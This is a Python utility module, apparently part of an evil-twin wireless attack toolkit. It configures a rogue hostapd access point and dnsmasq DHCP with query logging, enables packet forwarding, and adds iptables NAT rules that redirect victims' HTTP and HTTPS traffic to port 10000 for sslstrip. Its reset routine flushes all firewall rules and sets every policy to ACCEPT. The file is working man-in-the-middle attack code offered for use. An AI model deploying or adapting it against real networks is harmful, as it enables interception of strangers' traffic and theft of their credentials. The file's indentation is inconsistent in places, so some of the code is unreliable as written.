#!/usr/bin/python

# Name:        utils.py
# Author:      Gabriel 'solstice' Ryan
# Description: This script implements metnhods for use in wireless attack scripts.

import subprocess
import shutil
import time

HOSTAPD_CONF = '/etc/hostapd/hostapd.conf'
HOSTAPD_DEFAULT_DRIVER = 'nl80211'
HOSTAPD_DEFAULT_HW_MODE = 'g'

DNSMASQ_CONF = '/etc/dnsmasq.conf'


DNSMASQ_LOG = '/var/log/dnsmasq.log'


def bash_command(command):

	command = command.split()
	p = subprocess.Popen(command, stdout=subprocess.PIPE)
	output, err = p.communicate()

def enable_packet_forwarding():

    with open('/proc/sys/net/ipv4/ip_forward', 'w') as fd:
        fd.write('1')

def disable_packet_forwarding():

    with open('/proc/sys/net/ipv4/ip_forward', 'w') as fd:
        fd.write('0')

class IPTables(object):

    _instance = None
    
    def __init__(self):
        
        self.running = False
        self.reset()

    @staticmethod
    def get_instance():
        
        if IPTables._instance is None:
            IPTables._instance = IPTables()
        return IPTables._instance

    def route_to_sslstrip(self, phys, upstream):

	        bash_command('iptables --table nat --append POSTROUTING --out-interface %s -j MASQUERADE' % phys)
	        
	        bash_command('iptables --append FORWARD --in-interface %s -j ACCEPT' % upstream)
	
	        bash_command('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
	        bash_command('iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 10000')
	
	        bash_command('iptables -t nat -A POSTROUTING -j MASQUERADE')

    def reset(self):

        bash_command('iptables -P INPUT ACCEPT')
        bash_command('iptables -P FORWARD ACCEPT')
        bash_command('iptables -P OUTPUT ACCEPT')

        bash_command('iptables --flush')
        bash_command('iptables --flush -t nat')

class HostAPD(object):

    _instance = None
    
    def __init__(self):
        
        self.running = False
        self.conf = HOSTAPD_CONF

    @staticmethod
    def get_instance():
        
        if HostAPD._instance is None:
            HostAPD._instance = HostAPD()
        return HostAPD._instance

    def start(self):

        if self.running:
            raise Exception('[Utils] hostapd is already running.')

        self.running = True
        bash_command('hostapd %s' % self.conf)
        time.sleep(2)

    def stop(self):

        if not self.running:
            raise Exception('[Utils] hostapd is not running.')

        bash_command('killall hostapd')
        time.sleep(2)

    def configure(self,
            upstream,
            ssid,
            channel,
            driver=HOSTAPD_DEFAULT_DRIVER,
            hw_mode=HOSTAPD_DEFAULT_HW_MODE):

        # make backup of existing configuration file
        shutil.copy(self.conf, '%s.evil_twin.bak' % self.conf)

        with open(self.conf, 'w') as fd:
        
            fd.write('\n'.join([
                'interface=%s' % upstream,
                'driver=%s' % driver,
                'ssid=%s' % ssid,
                'channel=%d' % channel,
                'hw_mode=%s' % hw_mode,
            ]))

    def restore(self):

        shutil.copy('%s.evil_twin.bak' % self.conf, self.conf)


class DNSMasq(object):

    _instance = None
    
    def __init__(self):
        
        self.running = False
        self.conf = DNSMASQ_CONF

    @staticmethod
    def get_instance():
        
        if DNSMasq._instance is None:
            DNSMasq._instance = DNSMasq()
        return DNSMasq._instance

    def start(self):

        if self.running:
            raise Exception('[Utils] dnsmasq is already running.')

        self.running = True
        bash_command('service dnsmasq start')
        time.sleep(2)

    def stop(self):

        if not self.running:
            raise Exception('[Utils] dnsmasq is not running.')

        bash_command('killall dnsmasq')
        time.sleep(2)

    def configure(self,
                upstream,
                dhcp_range,
                dhcp_options=[],
                log_facility=DNSMASQ_LOG,
                log_queries=True):

        # make backup of existing configuration file
        shutil.copy(self.conf, '%s.evil_twin.bak' % self.conf)

        with open(self.conf, 'w') as fd:
        
            fd.write('\n'.join([
                'log-facility=%s' % log_facility,
                'interface=%s' % upstream,
                'dhcp-range=%s' % dhcp_range,
                '\n'.join('dhcp-option=%s' % o for o in dhcp_options),
            ]))
            if log_queries:
                fd.write('\nlog-queries')

    def restore(self):

        shutil.copy('%s.evil_twin.bak' % self.conf, self.conf)
